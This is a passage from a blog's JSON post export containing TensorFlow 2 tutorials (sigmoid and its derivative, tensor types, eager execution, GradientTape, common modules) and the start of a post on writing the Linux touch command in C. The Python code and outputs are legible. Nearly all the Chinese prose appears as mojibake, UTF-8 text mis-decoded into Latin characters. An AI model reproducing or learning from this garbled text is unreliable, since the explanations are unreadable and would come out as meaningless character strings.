ä¸­ä¼šç»å¸¸çœ‹åˆ°çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ˜¯é€»è¾‘å›å½’çš„åŸºç¡€ä¹Ÿå¯ä»¥å……å½“ç¥ç»ç½‘ç»œçš„æ¿€æ´»å‡½æ•°ã€‚Sigmoid å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š $\\mathit{sigmoid}(x) = \\frac{1}{1+e^{-x}}$ ä¸‹é¢ä½¿ç”¨Tensorflowå®ç°sigmoidå‡½æ•°ï¼š 1234import tensorflow as tftf.__version__Out: &#x27;2.1.0&#x27; 123def sigmoid(x): s = 1 / (1 + tf.math.exp(-x)) return s æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ TensorFlow 2 æä¾›çš„æ–¹æ³•åˆå§‹åŒ–ä¸€ç»„ [âˆ’10,10] ä¹‹é—´ç­‰é—´éš”çš„ 100 ä¸ªå€¼ï¼Œå¹¶ä½œä¸º Sigmoid å‡½æ•°çš„è¾“å…¥ã€‚æœ€ç»ˆï¼Œä½¿ç”¨ Matplotlib ç»˜åˆ¶å‡º Sigmoid å‡½æ•°çš„æ›²çº¿ã€‚åŒæ ·ï¼Œä½¿ç”¨ TensorFlow 2 æä¾›çš„ç›¸å…³æ–¹æ³•ã€‚ 12345from matplotlib import pyplot as plt%matplotlib inlinex = tf.linspace(-10.0, 10.0, 100)plt.plot(x, sigmoid(x)) æ¥ä¸‹æ¥ï¼Œå¯¹ Sigmoid å‡½æ•°æ±‚å¯¼ï¼Œå¹¶å®ç° Sigmoid å¯¼æ•°å‡½æ•° sigmoid_derivative(x)ï¼š 123def sigmoid_derivative(x): d_s = sigmoid(x) * (1 - sigmoid(x)) return d_s åŒæ ·ï¼Œä½¿ç”¨ä¸Šé¢åˆå§‹åŒ–å¥½çš„ x å€¼ï¼Œç»˜åˆ¶ Sigmoid å‡½æ•°å¯¼æ•°çš„å˜åŒ–æ›²çº¿ã€‚ 1plt.plot(x, sigmoid_derivative(x)) è‡ªåŠ¨å¾®åˆ†TensorFlow ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ tf.GradientTape è·Ÿè¸ªå…¨éƒ¨è¿ç®—è¿‡ç¨‹ï¼Œä»¥ä¾¿åœ¨å¿…è¦çš„æ—¶å€™è®¡ç®—æ¢¯åº¦ã€‚å½“ç„¶ï¼Œå¯¹äºä¸Šæ–¹ Sigmoid ä¸€å…ƒå‡½æ•°è€Œè¨€ï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨æ±‚å¯¼è¿‡ç¨‹ã€‚ æ¥ä¸‹æ¥ï¼Œä½¿ç”¨åœ¨å®éªŒä¸­å­¦ä¹ åˆ°çš„æ–¹æ³•ï¼Œä½¿ç”¨ tf.GradientTape å®Œæˆè‡ªåŠ¨å¾®åˆ†ã€‚åŒæ ·ï¼Œéœ€è¦ä¼ å…¥å‰é¢ç”Ÿæˆçš„ç­‰é—´è· x å¹¶ç»˜åˆ¶å‡ºå¯¼æ•°çš„å˜åŒ–æ›²çº¿ã€‚æç¤ºï¼Œåœ¨è®¡ç®—æ¢¯åº¦çš„è¿‡ç¨‹ä¸­ï¼Œx å¯èƒ½éœ€è¦è¢«è½¬æ¢ä¸ºå˜é‡å¼ é‡ã€‚ 12345678x = tf.Variable(x)with tf.GradientTape() as tape: # è¿½è¸ªæ¢¯åº¦ s = 1 / (1 + tf.math.exp(-x))grad = tape.gradient(s, x) # è®¡ç®—æ¢¯åº¦grad 1plt.plot(x.numpy(), grad.numpy()) # ç»˜åˆ¶ sigmoid å¯¼æ•°å˜åŒ–æ›²çº¿ å¯ä»¥å‘ç°ï¼Œå€ŸåŠ©äºè‡ªåŠ¨å¾®åˆ†æœºåˆ¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä¹¦å†™è®¡ç®—è¿‡ç¨‹å³å¯å¾—åˆ°å…³äºä»»æ„å˜é‡çš„å¾®åˆ†ç»“æœã€‚","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"TensorFlow2åŸºç¡€æ¦‚å¿µè¯­æ³•","slug":"TensorFlow2.0/TensorFlow2åŸºç¡€æ¦‚å¿µè¯­æ³•","date":"2020-10-26T09:41:24.000Z","updated":"2020-10-26T10:20:26.000Z","comments":true,"path":"2020/10/26/TensorFlow2.0/TensorFlow2åŸºç¡€æ¦‚å¿µè¯­æ³•/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/","excerpt":"","text":"å¼ é‡æ•°å­¦æˆ–ç‰©ç†ä¸Šå…³äºå¼ é‡çš„ä¸¤ç§å®šä¹‰æ–¹æ³•ï¼ˆæŠ½è±¡ï¼‰ï¼š é€šå¸¸å®šä¹‰å¼ é‡çš„ç‰©ç†å­¦æˆ–ä¼ ç»Ÿæ•°å­¦æ–¹æ³•ï¼Œæ˜¯æŠŠå¼ é‡çœ‹æˆä¸€ä¸ªå¤šç»´æ•°ç»„ï¼Œå½“å˜æ¢åæ ‡æˆ–å˜æ¢åŸºåº•æ—¶ï¼Œå…¶åˆ†é‡ä¼šæŒ‰ç…§ä¸€å®šè§„åˆ™è¿›è¡Œå˜æ¢ï¼Œè¿™äº›è§„åˆ™æœ‰ä¸¤ç§ï¼šå³åå˜æˆ–é€†å˜è½¬æ¢ã€‚ é€šå¸¸ç°ä»£æ•°å­¦ä¸­çš„æ–¹æ³•ï¼Œæ˜¯æŠŠå¼ é‡å®šä¹‰æˆæŸä¸ªçŸ¢é‡ç©ºé—´æˆ–å…¶å¯¹å¶ç©ºé—´ä¸Šçš„å¤šé‡çº¿æ€§æ˜ å°„ï¼Œè¿™çŸ¢é‡ç©ºé—´åœ¨éœ€è¦å¼•å…¥åŸºåº•ä¹‹å‰ä¸å›ºå®šä»»ä½•åæ ‡ç³»ç»Ÿã€‚ä¾‹å¦‚åå˜çŸ¢é‡ï¼Œå¯ä»¥æè¿°ä¸º 1-å½¢å¼ï¼Œæˆ–è€…ä½œä¸ºé€†å˜çŸ¢é‡çš„å¯¹å¶ç©ºé—´çš„å…ƒç´ ã€‚ é€šä¿—æ¥è®²ï¼Œä¸€é˜¶å¼ é‡ä¸ºå‘é‡ï¼ŒäºŒé˜¶å¼ é‡ä¸ºçŸ©é˜µã€‚å½“ç„¶ï¼Œé›¶é˜¶å¼ é‡ä¹Ÿå°±æ˜¯æ ‡é‡ï¼Œè€Œæ›´é‡è¦çš„æ˜¯ ğ‘ é˜¶å¼ é‡ï¼Œä¹Ÿå°±æ˜¯ ğ‘ ç»´æ•°ç»„ã€‚ é˜¶ æ•°å­¦å®ä¾‹ 0 æ ‡é‡ï¼ˆåªæœ‰å¤§å°ï¼‰ 1 çŸ¢é‡ï¼ˆå¤§å°å’Œæ–¹å‘ï¼‰ 2 çŸ©é˜µï¼ˆæ•°æ®è¡¨ï¼‰ 3 3 é˜¶å¼ é‡ï¼ˆæ•°æ®ç«‹ä½“ï¼‰ N N é˜¶å¼ é‡ï¼ˆè‡ªè¡Œæƒ³è±¡ï¼‰ å¤§å¤šæ•°æ·±åº¦å­¦ä¹ æ¡†æ¶éƒ½ä¼šä½¿ç”¨å¼ é‡çš„æ¦‚å¿µï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ç»Ÿä¸€å¯¹æ•°æ®çš„å®šä¹‰ã€‚NumPy ä¸­ï¼Œæ•°æ®éƒ½ä½¿ç”¨ Ndarray å¤šç»´æ•°ç»„è¿›è¡Œå®šä¹‰ï¼ŒTensorFlow ä¸­ï¼Œæ•°æ®éƒ½ä¼šç”¨å¼ é‡è¿›è¡Œè¡¨è¿°ã€‚ ä¸‹é¢å°±æ¥å­¦ä¹  TensorFlow ä¸­å¯¹å¼ é‡çš„å®šä¹‰ã€‚åœ¨ TensorFlow ä¸­ï¼Œæ¯ä¸€ä¸ª Tensor éƒ½å…·å¤‡ä¸¤ä¸ªåŸºç¡€å±æ€§ï¼šæ•°æ®ç±»å‹ï¼ˆé»˜è®¤ï¼šfloat32ï¼‰å’Œå½¢çŠ¶ã€‚ å…¶ä¸­ï¼Œæ•°æ®ç±»å‹å¤§è‡´å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š Tensor ç±»å‹ æè¿° tf.float32 32 ä½æµ®ç‚¹æ•° tf.float64 64 ä½æµ®ç‚¹æ•° tf.int64 64 ä½æœ‰ç¬¦å·æ•´å‹ tf.int32 32 ä½æœ‰ç¬¦å·æ•´å‹ tf.int16 16 ä½æœ‰ç¬¦å·æ•´å‹ tf.int8 8 ä½æœ‰ç¬¦å·æ•´å‹ tf.uint8 8 ä½æ— ç¬¦å·æ•´å‹ tf.string å¯å˜é•¿åº¦çš„å­—èŠ‚æ•°ç»„ tf.bool å¸ƒå°”å‹ tf.complex64 å®æ•°å’Œè™šæ•° å¦å¤–ï¼ŒTensorFlow é€šè¿‡ä¸‰ç§ç¬¦å·çº¦å®šæ¥æè¿°å¼ é‡ç»´åº¦ï¼šé˜¶ï¼Œå½¢çŠ¶å’Œç»´æ•°ã€‚ä¸‰è€…ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹ï¼š å½¢çŠ¶ é˜¶ ç»´æ•° ç¤ºä¾‹ [] 0 0-D 0 ç»´å¼ é‡ï¼Œæ ‡é‡ã€‚ [D0] 1 1-D å½¢çŠ¶ä¸º [5] çš„ 1 ç»´å¼ é‡ã€‚ [D0, D1] 2 2-D å½¢çŠ¶ä¸º [3, 4] çš„ 2 ç»´å¼ é‡ã€‚ [D0, D1, D2] 3 3-D å½¢çŠ¶ä¸º [1, 4, 3] çš„ 3 ç»´å¼ é‡ã€‚ [D0, D1, â€¦ Dn-1] n n-D å½¢çŠ¶ä¸º [D0, D1, â€¦ Dn-1] çš„å¼ é‡ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸Šè¡¨ä¸­çš„ç¤ºä¾‹éƒ½æ˜¯å½¢å®¹å¼ é‡çš„å½¢çŠ¶ã€‚ä¾‹å¦‚ [3, 4] æŒ‡çš„å¼ é‡çš„å½¢çŠ¶ä¸º [3, 4]ï¼Œè€Œä¸æ˜¯å¼ é‡ [3, 4]ã€‚ æ ¹æ®ä¸åŒçš„ç”¨é€”ï¼ŒTensorFlow ä¸­ä¸»è¦æœ‰ 2 ç§å¼ é‡ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ï¼š tf.Variable ï¼šå˜é‡ Tensorï¼Œéœ€è¦æŒ‡å®šåˆå§‹å€¼ï¼Œå¸¸ç”¨äºå®šä¹‰å¯å˜å‚æ•°ï¼Œä¾‹å¦‚ç¥ç»ç½‘ç»œçš„æƒé‡ã€‚ tf.constant ï¼šå¸¸é‡ Tensorï¼Œéœ€è¦æŒ‡å®šåˆå§‹å€¼ï¼Œå®šä¹‰ä¸å˜åŒ–çš„å¼ é‡ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥åˆ—è¡¨æˆ– NumPy æ•°ç»„æ¥æ–°å»ºå˜é‡å’Œå¸¸é‡ç±»å‹çš„å¼ é‡ï¼š æŸ¥çœ‹tensorflowç‰ˆæœ¬ 1234import tensorflow as tftf.__version__Out: &#x27;2.1.0&#x27; è¾“å…¥å½¢çŠ¶ä¸º (2, 2) çš„äºŒç»´å˜é‡ 123456v = tf.Variable([[1, 2], [3, 4]]) # å½¢çŠ¶ä¸º (2, 2) çš„äºŒç»´å˜é‡vOut: &lt;tf.Variable &#x27;Variable:0&#x27; shape=(2, 2) dtype=int32, numpy= array([[1, 2], [3, 4]], dtype=int32)&gt; è¾“å…¥å½¢çŠ¶ä¸º (2, 2) çš„äºŒç»´å¸¸é‡ 123456c = tf.constant([[1, 2], [3, 4]]) # å½¢çŠ¶ä¸º (2, 2) çš„äºŒç»´å¸¸é‡cOut: &lt;tf.Tensor: shape=(2, 2), dtype=int32, numpy= array([[1, 2], [3, 4]], dtype=int32)&gt; è¾“å‡ºåŒ…å«äº†å¼ é‡çš„ 3 éƒ¨åˆ†å±æ€§ï¼Œåˆ†åˆ«æ˜¯å½¢çŠ¶ shapeï¼Œæ•°æ®ç±»å‹ dtypeï¼Œä»¥åŠå¯¹åº”çš„ NumPy æ•°ç»„ã€‚ è¿˜å¯ä»¥ç›´æ¥é€šè¿‡ .numpy() è¾“å‡ºå¼ é‡çš„ NumPy æ•°ç»„ï¼š 1234c.numpy()Out: array([[1, 2], [3, 4]], dtype=int32) ä¸‹é¢åˆ—ä¸¾å‡ ä¸ªç»å¸¸ä¼šç”¨åˆ°çš„æ–°å»ºç‰¹æ®Šå¸¸é‡å¼ é‡çš„æ–¹æ³•ï¼š tf.zerosï¼šæ–°å»ºæŒ‡å®šå½¢çŠ¶ä¸”å…¨ä¸º 0 çš„å¸¸é‡ Tensor tf.zeros_likeï¼šå‚è€ƒæŸç§å½¢çŠ¶ï¼Œæ–°å»ºå…¨ä¸º 0 çš„å¸¸é‡ Tensor tf.onesï¼šæ–°å»ºæŒ‡å®šå½¢çŠ¶ä¸”å…¨ä¸º 1 çš„å¸¸é‡ Tensor tf.ones_likeï¼šå‚è€ƒæŸç§å½¢çŠ¶ï¼Œæ–°å»ºå…¨ä¸º 1 çš„å¸¸é‡ Tensor tf.fillï¼šæ–°å»ºä¸€ä¸ªæŒ‡å®šå½¢çŠ¶ä¸”å…¨ä¸ºæŸä¸ªæ ‡é‡å€¼çš„å¸¸é‡ Tensor 3x3 å…¨ä¸º 0 çš„å¸¸é‡ Tensor 1234567c = tf.zeros([3, 3]) # 3x3 å…¨ä¸º 0 çš„å¸¸é‡ TensorcOut: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], dtype=float32)&gt; ä¸ c å½¢çŠ¶ä¸€è‡´å…¨ä¸º 1 çš„å¸¸é‡ Tensor 123456tf.ones_like(c) # ä¸ c å½¢çŠ¶ä¸€è‡´å…¨ä¸º 1 çš„å¸¸é‡ TensorOut: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.]], dtype=float32)&gt; 2x3 å…¨ä¸º 6 çš„å¸¸é‡ Tensor 12345tf.fill([2, 3], 6) # 2x3 å…¨ä¸º 6 çš„å¸¸é‡ TensorOut: &lt;tf.Tensor: shape=(2, 3), dtype=int32, numpy= array([[6, 6, 6], [6, 6, 6]], dtype=int32)&gt; é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åˆ›å»ºä¸€äº›åºåˆ—: tf.linspaceï¼šåˆ›å»ºä¸€ä¸ªç­‰é—´éš”åºåˆ—ã€‚ tf.rangeï¼šåˆ›å»ºä¸€ä¸ªæ•°å­—åºåˆ—ã€‚ 123tf.linspace(1.0, 10.0, 5, name=&quot;linspace&quot;)Out: &lt;tf.Tensor: shape=(5,), dtype=float32, numpy=array([ 1. , 3.25, 5.5 , 7.75, 10. ], dtype=float32)&gt; 123tf.range(start=1, limit=10, delta=2)Out: &lt;tf.Tensor: shape=(5,), dtype=int32, numpy=array([1, 3, 5, 7, 9], dtype=int32)&gt; Eager ExecutionTensorFlow 2 å¸¦æ¥çš„æœ€å¤§æ”¹å˜ä¹‹ä¸€æ˜¯å°† 1.x çš„ Graph Executionï¼ˆå›¾ä¸ä¼šè¯æœºåˆ¶ï¼‰æ›´æ”¹ä¸º Eager Executionï¼ˆåŠ¨æ€å›¾æœºåˆ¶ï¼‰ã€‚åœ¨ 1.x ç‰ˆæœ¬ä¸­ï¼Œä½çº§åˆ« TensorFlow API é¦–å…ˆéœ€è¦å®šä¹‰æ•°æ®æµå›¾ï¼Œç„¶åå†åˆ›å»º TensorFlow ä¼šè¯ï¼Œè¿™ä¸€ç‚¹åœ¨ 2.0 ä¸­è¢«å®Œå…¨èˆå¼ƒã€‚TensorFlow 2 ä¸­çš„ Eager Execution æ˜¯ä¸€ç§å‘½ä»¤å¼ç¼–ç¨‹ç¯å¢ƒï¼Œå¯ç«‹å³è¯„ä¼°æ“ä½œï¼Œæ— éœ€æ„å»ºå›¾ã€‚ æ‰€ä»¥è¯´ï¼ŒTensorFlow çš„å¼ é‡è¿ç®—è¿‡ç¨‹å¯ä»¥åƒ NumPy ä¸€æ ·ç›´è§‚ä¸”è‡ªç„¶äº†ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥æœ€ç®€å•çš„åŠ æ³•è¿ç®—ä¸ºä¾‹ï¼š 123456c + c # åŠ æ³•è®¡ç®—Out: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], dtype=float32)&gt; 1.x ç‰ˆæœ¬çš„ TensorFlowï¼Œä¸€ä¸ªåŠ æ³•è¿ç®—è¿‡ç¨‹ååˆ†å¤æ‚ã€‚æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å…¨å±€å˜é‡ â†’ å»ºç«‹ä¼šè¯ â†’ æ‰§è¡Œè®¡ç®—ï¼Œæœ€ç»ˆæ‰èƒ½æ‰“å°å‡ºå¼ é‡çš„è¿ç®—ç»“æœã€‚ 1234init_op = tf.global_variables_initializer() # åˆå§‹åŒ–å…¨å±€å˜é‡with tf.Session() as sess: # å¯åŠ¨ä¼šè¯ sess.run(init_op) print(sess.run(c + c)) # æ‰§è¡Œè®¡ç®— Eager Execution å¸¦æ¥çš„å¥½å¤„æ˜¾è€Œæ˜“è§ï¼Œå…¶è¿›ä¸€æ­¥é™ä½äº† TensorFlow çš„å…¥é—¨é—¨æ§›ã€‚ä¹‹å‰çš„ Graph Execution æ¨¡å¼ï¼Œå®é™…ä¸Šè®©å¾ˆå¤šäººåœ¨å…¥é—¨æ—¶éƒ½å¾ˆéƒé—·ï¼Œå› ä¸ºå®Œå…¨ä¸ç¬¦åˆæ­£å¸¸æ€ç»´ä¹ æƒ¯ã€‚ TensorFlow ä¸­æä¾›çš„æ•°å­¦è®¡ç®—ï¼ŒåŒ…æ‹¬çº¿æ€§ä»£æ•°è®¡ç®—æ–¹é¢çš„æ–¹æ³•ä¹Ÿæ˜¯åº”æœ‰å°½æœ‰ï¼Œååˆ†ä¸°å¯Œã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬å†åˆ—ä¸¾å‡ ä¸ªç¤ºä¾‹: çŸ©é˜µä¹˜æ³•ï¼š 123456789a = tf.constant([1., 2., 3., 4., 5., 6.], shape=[2, 3])b = tf.constant([7., 8., 9., 10., 11., 12.], shape=[3, 2])c = tf.linalg.matmul(a, b) # çŸ©é˜µä¹˜æ³•cOut: &lt;tf.Tensor: shape=(2, 2), dtype=float32, numpy= array([[ 58., 64.], [139., 154.]], dtype=float32)&gt; è½¬ç½®çŸ©é˜µï¼š 12345tf.linalg.matrix_transpose(c) # è½¬ç½®çŸ©é˜µOut: &lt;tf.Tensor: shape=(2, 2), dtype=float32, numpy= array([[ 58., 139.], [ 64., 154.]], dtype=float32)&gt; å¯ä»¥æŠŠ TensorFlow ç†è§£æˆä¸º TensorFlow å¼çš„ NumPy + ä¸ºæ­å»ºç¥ç»ç½‘ç»œè€Œç”Ÿçš„ API è‡ªåŠ¨å¾®åˆ†åœ¨æ•°å­¦ä¸­ï¼Œå¾®åˆ†æ˜¯å¯¹å‡½æ•°çš„å±€éƒ¨å˜åŒ–ç‡çš„ä¸€ç§çº¿æ€§æè¿°ã€‚è™½ç„¶å¾®åˆ†å’Œå¯¼æ•°æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µã€‚ä½†æ˜¯ï¼Œå¯¹ä¸€å…ƒå‡½æ•°æ¥è¯´ï¼Œå¯å¾®ä¸å¯å¯¼æ˜¯å®Œå…¨ç­‰ä»·çš„ã€‚å¦‚æœç†Ÿæ‚‰ç¥ç»ç½‘ç»œçš„æ­å»ºè¿‡ç¨‹ï¼Œåº”è¯¥æ˜ç™½æ¢¯åº¦çš„é‡è¦æ€§ã€‚è€Œå¯¹äºå¤æ‚å‡½æ•°çš„å¾®åˆ†è¿‡ç¨‹æ˜¯æå…¶éº»çƒ¦çš„ï¼Œä¸ºäº†æé«˜åº”ç”¨æ•ˆç‡ï¼Œå¤§éƒ¨åˆ†æ·±åº¦å­¦ä¹ æ¡†æ¶éƒ½æœ‰è‡ªåŠ¨å¾®åˆ†æœºåˆ¶ã€‚ TensorFlow ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ tf.GradientTape è·Ÿè¸ªå…¨éƒ¨è¿ç®—è¿‡ç¨‹ï¼Œä»¥ä¾¿åœ¨å¿…è¦çš„æ—¶å€™è®¡ç®—æ¢¯åº¦ã€‚ 123456789w = tf.Variable([1.0]) # æ–°å»ºå¼ é‡with tf.GradientTape() as tape: # è¿½è¸ªæ¢¯åº¦ loss = w * wgrad = tape.gradient(loss, w) # è®¡ç®—æ¢¯åº¦gradOut: &lt;tf.Tensor: shape=(1,), dtype=float32, numpy=array([2.], dtype=float32)&gt; ä¸Šé¢æ¼”ç¤ºäº†ä¸€ä¸ªè‡ªåŠ¨å¾®åˆ†è¿‡ç¨‹ï¼Œå®ƒçš„æ•°å­¦æ±‚å¯¼è¿‡ç¨‹å¦‚ä¸‹ï¼š $$ loss = w^2 \\rightarrow \\frac {\\partial loss}{\\partial w} = 2w $$ æ‰€ä»¥ï¼Œå½“ w ç­‰äº 1 æ—¶ï¼Œè®¡ç®—ç»“æœä¸º 2ã€‚ tf.GradientTape ä¼šåƒç£å¸¦ä¸€æ ·è®°å½•ä¸‹è®¡ç®—å›¾ä¸­çš„æ¢¯åº¦ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨ .gradient å³å¯å›æº¯è®¡ç®—å‡ºä»»æ„æ¢¯åº¦ï¼Œè¿™å¯¹äºä½¿ç”¨ TensorFlow ä½é˜¶ API æ„å»ºç¥ç»ç½‘ç»œæ—¶æ›´æ–°å‚æ•°éå¸¸é‡è¦ã€‚ å¸¸ç”¨æ¨¡å—ä¸Šé¢å·²ç»å­¦ä¹ äº† TensorFlow æ ¸å¿ƒçŸ¥è¯†ï¼Œæ¥ä¸‹æ¥å°†å¯¹ TensorFlow API ä¸­çš„å¸¸ç”¨æ¨¡å—è¿›è¡Œç®€å•çš„åŠŸèƒ½ä»‹ç»ã€‚å¯¹äºæ¡†æ¶çš„ä½¿ç”¨ï¼Œå®é™…ä¸Šå°±æ˜¯çµæ´»è¿ç”¨å„ç§å°è£…å¥½çš„ç±»å’Œå‡½æ•°ã€‚ç”±äº TensorFlow API æ•°é‡å¤ªå¤šï¼Œè¿­ä»£å¤ªå¿«ï¼Œæ‰€ä»¥è¦å…»æˆéšæ—¶ æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ çš„ä¹ æƒ¯ã€‚ tf.ï¼šåŒ…å«äº†å¼ é‡å®šä¹‰ï¼Œå˜æ¢ç­‰å¸¸ç”¨å‡½æ•°å’Œç±»ã€‚ tf.dataï¼šè¾“å…¥æ•°æ®å¤„ç†æ¨¡å—ï¼Œæä¾›äº†åƒ tf.data.Dataset ç­‰ç±»ç”¨äºå°è£…è¾“å…¥æ•°æ®ï¼ŒæŒ‡å®šæ‰¹é‡å¤§å°ç­‰ã€‚ tf.imageï¼šå›¾åƒå¤„ç†æ¨¡å—ï¼Œæä¾›äº†åƒå›¾åƒè£å‰ªï¼Œå˜æ¢ï¼Œç¼–ç ï¼Œè§£ç ç­‰ç±»ã€‚ tf.kerasï¼šåŸ Keras æ¡†æ¶é«˜é˜¶ APIã€‚åŒ…å«åŸ tf.layers ä¸­é«˜é˜¶ç¥ç»ç½‘ç»œå±‚ã€‚ tf.linalgï¼šçº¿æ€§ä»£æ•°æ¨¡å—ï¼Œæä¾›äº†å¤§é‡çº¿æ€§ä»£æ•°è®¡ç®—æ–¹æ³•å’Œç±»ã€‚ tf.lossesï¼šæŸå¤±å‡½æ•°æ¨¡å—ï¼Œç”¨äºæ–¹ä¾¿ç¥ç»ç½‘ç»œå®šä¹‰æŸå¤±å‡½æ•°ã€‚ tf.mathï¼šæ•°å­¦è®¡ç®—æ¨¡å—ï¼Œæä¾›äº†å¤§é‡æ•°å­¦è®¡ç®—å‡½æ•°ã€‚ tf.saved_modelï¼šæ¨¡å‹ä¿å­˜æ¨¡å—ï¼Œå¯ç”¨äºæ¨¡å‹çš„ä¿å­˜å’Œæ¢å¤ã€‚ tf.trainï¼šæä¾›ç”¨äºè®­ç»ƒçš„ç»„ä»¶ï¼Œä¾‹å¦‚ä¼˜åŒ–å™¨ï¼Œå­¦ä¹ ç‡è¡°å‡ç­–ç•¥ç­‰ã€‚ tf.nnï¼šæä¾›ç”¨äºæ„å»ºç¥ç»ç½‘ç»œçš„åº•å±‚å‡½æ•°ï¼Œä»¥å¸®åŠ©å®ç°æ·±åº¦ç¥ç»ç½‘ç»œå„ç±»åŠŸèƒ½å±‚ã€‚ tf.estimatorï¼šé«˜é˜¶ APIï¼Œæä¾›äº†é¢„åˆ›å»ºçš„ Estimator æˆ–è‡ªå®šä¹‰ç»„ä»¶ã€‚ åœ¨æ„å»ºæ·±åº¦ç¥ç»ç½‘ç»œæ—¶ï¼ŒTensorFlow å¯ä»¥è¯´æä¾›äº†ä½ ä¸€åˆ‡æƒ³è¦çš„ç»„ä»¶ï¼Œä»ä¸åŒå½¢çŠ¶çš„å¼ é‡ã€æ¿€æ´»å‡½æ•°ã€ç¥ç»ç½‘ç»œå±‚ï¼Œåˆ°ä¼˜åŒ–å™¨ã€æ•°æ®é›†ç­‰ï¼Œä¸€åº”ä¿±å…¨ã€‚","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"Cè¯­è¨€å®ç°Linux-touchå‘½ä»¤","slug":"C/Cè¯­è¨€å®ç°Linux-touchå‘½ä»¤","date":"2020-10-25T01:10:55.000Z","updated":"2020-10-27T08:05:50.000Z","comments":true,"path":"2020/10/25/C/Cè¯­è¨€å®ç°Linux-touchå‘½ä»¤/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/25/C/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Linux-touch%E5%91%BD%E4%BB%A4/","excerpt":"","text":"å®éªŒä»‹ç»1.å®éªŒç®€ä»‹Linux çš„ touch å‘½ä»¤ç”¨æ¥ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³ï¼Œæˆ–è€…æ–°å»ºä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š 1touch [-acm][-r ref_file(å‚ç…§æ–‡ä»¶)|-t time(æ—¶é—´å€¼)] file(æ–‡ä»¶å) c æœ¬å®éªŒåŸºäº C è¯­è¨€å®ç° Linux touch å‘½ä»¤çš„ [-acm] é€‰é¡¹ã€‚ æ³¨: touch file1.txt æ›´æ–° file1.txt çš„å­˜å–å’Œä¿®æ”¹æ—¶é—´touch -a file1.txt æ”¹å˜ file1.txt çš„è¯»å–æ—¶é—´è®°å½•touch -c file1.txt å¦‚æœ file1.txt ä¸å­˜åœ¨ï¼Œä¸åˆ›å»ºæ–‡ä»¶touch -m file1.txt æ”¹å˜ file1.txt çš„ä¿®æ”¹æ—¶é—´è®°å½• 2. çŸ¥è¯†ç‚¹ å‡½æ•° getopt UNIX ç³»ç»Ÿå‡½æ•° open å‡½æ•° utimensat 3. å®éªŒç¯å¢ƒ Xfceç»ˆç«¯ GCC Gedit å®éªŒæ­¥éª¤æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬æœ€å¥½å…ˆæ¥äº†è§£å®ƒæ˜¯å¹²å˜›ç”¨çš„ä»¥åŠæ€ä¹ˆç”¨çš„ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä»ä½¿ç”¨è€…çš„è§’åº¦æ¥äº†è§£ä¸€ä¸‹ touch å‘½ä»¤çš„ç”¨å¤„åŠç”¨æ³•ï¼š 1man touch ä» man touch çš„è¾“å‡ºæ¥çœ‹ï¼Œè¯¥å‘½ä»¤çš„ç”¨å¤„å°±æ˜¯ï¼Œä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œç³»ç»Ÿä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚åŸºæœ¬ç”¨æ³•ï¼Œå¯ä»¥ä¸å¸¦ä»»ä½•å‚æ•°ç›´æ¥æ‰§è¡Œ touch filenameï¼Œå¦‚ä¸‹ï¼š 